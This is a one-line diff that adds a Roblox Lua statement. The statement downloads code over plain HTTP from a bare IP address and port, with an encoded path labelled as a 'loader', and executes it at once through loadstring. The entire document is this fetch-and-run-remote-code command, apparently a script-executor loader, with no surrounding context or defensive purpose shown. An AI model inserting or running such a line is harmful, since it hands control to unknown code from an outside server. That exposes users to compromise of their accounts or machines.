@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImMwMDJkNDU4LWUzYTAtNDM5OC04Nzc3LTdkMTI5ZDUwN2I1OCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
